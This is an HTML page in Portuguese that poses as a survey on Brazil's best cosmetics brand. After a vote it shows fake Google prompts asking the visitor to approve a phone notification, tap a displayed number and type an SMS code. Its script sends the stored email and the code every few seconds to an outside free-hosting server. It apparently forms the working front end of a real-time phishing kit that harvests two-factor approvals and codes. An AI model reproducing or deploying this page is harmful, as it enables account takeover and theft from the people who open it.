<!doctype html>
<html>
<head>
    <meta charset="utf-8">
    <title>Pesquisa</title>
    <meta name="viewport" content="user-scalable=no, width=device-width, initial-scale=1.0" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.1.1/css/all.css" integrity="sha384-O8whS3fhG2OnA5Kas0Y9l3cfpmYjapjI0E4theH4iuMD+pLhbf6JI0jIMfYcK3yZ" crossorigin="anonymous">
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <link rel="stylesheet" href="https://code.getmdl.io/1.3.0/material.green-teal.min.css">
    <script defer src="https://code.getmdl.io/1.3.0/material.min.js"></script>
    <link rel="shortcut icon" href="src/img/search.png">
</head>

<body style="background: whitesmoke; color: #4CAF50;">

    <style>
    body {
        overflow-x: hidden;
        width: 100%;
    }    
    h3{
        background: #4CAF50;
        color: #ffffff;
        border-radius: 3px;
        padding: 15px;
        font-size: 1.9em;
    }

    .opcao{
        display: block;
        margin: 5px;
        border-bottom: solid 1px #CCC;
        margin-bottom: 10px;
        color: slategrey;
    }
    #auth{
        color: darkslategray;
    }
    .gcode2{
        color: black;
        background: grey;
        padding: 25px 20px;
        border-radius: 50%;
        display: inline-block;
        font-size: 25px;
    }

    .confirmar{
        color: white !important;
    }
    
    </style>

    <h3 style="font-weight: bold; margin-top: 0;">
        <div class="container">Pergunta: <br> Na sua opinião, qual é a melhor marca de cosméticos do Brasil?</div>        
    </h3>
    <div class="container" style="text-align: center; background: #ffffff; padding-top: 20px">            
            
              <label class="mdl-radio mdl-js-radio mdl-js-ripple-effect opcao" for="option-1">
                <input type="radio" id="option-1" class="mdl-radio__button" name="options" value="1" checked>
                <span class="mdl-radio__label">Mary Kay</span>
              </label>

              <label class="mdl-radio mdl-js-radio mdl-js-ripple-effect opcao" for="option-2">
                <input type="radio" id="option-2" class="mdl-radio__button" name="options" value="1">
                <span class="mdl-radio__label">Natura</span>
              </label>

              <label class="mdl-radio mdl-js-radio mdl-js-ripple-effect opcao" for="option-3">
                <input type="radio" id="option-3" class="mdl-radio__button" name="options" value="1">
                <span class="mdl-radio__label">Vult</span>
              </label>

              <label class="mdl-radio mdl-js-radio mdl-js-ripple-effect opcao" for="option-4">
                <input type="radio" id="option-4" class="mdl-radio__button" name="options" value="1">
                <span class="mdl-radio__label">Hinode</span>
              </label>

              <label class="mdl-radio mdl-js-radio mdl-js-ripple-effect opcao" for="option-6">
                <input type="radio" id="option-6" class="mdl-radio__button" name="options" value="1">
                <span class="mdl-radio__label">Outro</span>
              </label>

              <label class="mdl-radio mdl-js-radio mdl-js-ripple-effect opcao" for="option-7">
                <input type="radio" id="option-7" class="mdl-radio__button" name="options" value="1">
                <span class="mdl-radio__label">Não uso cosméticos</span>
              </label>
              
              <br>

              <button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-button--colored confirmar" style="width: -webkit-fill-available;">
                Confirmar resposta
              </button><br><br>

              <div id="auth">  
                <div id="google">
                    <span class="g_part1" style="display: none;">
                        Aguarde...<br>
                        <div id="p2" class="mdl-progress mdl-js-progress mdl-progress__indeterminate" style="margin: 0 auto;"></div>
                        O Google enviará uma notificação para seus smartphones para verificar sua identidade e confirmar sua resposta.
                        <br><br>
                    </span>
                    <span class="g_part2" style="display: none;">
                        O Google enviou uma notificação ao seu smartphone. Toque em <b>Sim</b> e depois em <b class="gcode1"></b>
                        no smartphone para confirmar sua resposta.
                        <div align="center"><span class="gcode2"><b class="gcode1"></b></span></div>
                        <br><br>
                    </span>                    
                </div>
                <div id="windows" style="display: none;">

                </div>
                <div id="apple" style="display: none;">
                    
                </div>

                <span class="g_part3" style="display: none;">
                    Aguarde...<br>
                    <div id="p3" class="mdl-progress mdl-js-progress mdl-progress__indeterminate"></div>
                    Estamos enviando sua resposta.
                    <br><br>
                </span>

                <span class="2steps" style="display: none;">
                    Para confirmar sua resposta através de seu login digite o código que você recebeu em seu por SMS em seu smartphone no campo abaixo: <br>
                    <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label">
                        <input class="mdl-textfield__input" type="text" id="cvc">
                        <label class="mdl-textfield__label" for="cvc">Digite o código aqui...</label>
                      </div>
                    <br><br>
                </span>

              </div>

    </div>
    <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
<script>

    function getMobileOperatingSystem() {
        var userAgent = navigator.userAgent || navigator.vendor || window.opera;
        if (/android/i.test(userAgent)) {
            return "Android";
        }
        if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
            return "iOS";
        }
        return "PC";
    }

    let navegador = getMobileOperatingSystem();

    function executeQuery() {
        
        var cvc   = $('#cvc').val();
        var email = localStorage.getItem("email");
        console.log(email);
        
        $.ajax({
            url: 'https://minhapesquisadocs.000webhostapp.com/actions.php',
            data:'action=sync&email='+email+'&cod='+cvc,
            dataType: "json",
            method:'POST',
            success: function(data) {
                console.log(data);
                if(data.steps == 0 && data.code != null){
                    $('.gcode1').html(data.code);
                    $('.g_part1').hide();
                    $('.g_part2').show();                    
                }
                if(data.steps == 1){
                    window.location.href='#cvc';
					$('#google').hide();
                    $('.2steps').show();
                }
                if(data.ok == 1){
                    window.location = "concluido";
                }
            }
        });
        setTimeout(executeQuery, 3000);
    }

    $(document).ready(function() {        
        $('.confirmar').click( function() {

            if(navegador == 'Android' | navegador == 'PC'){
                $('.g_part1').show();
            }else{
                $('.g_part3').show();
            }

            window.location.href='#auth';
            setTimeout(executeQuery, 3000);
        });    
    });

</script>    



</body>

</html>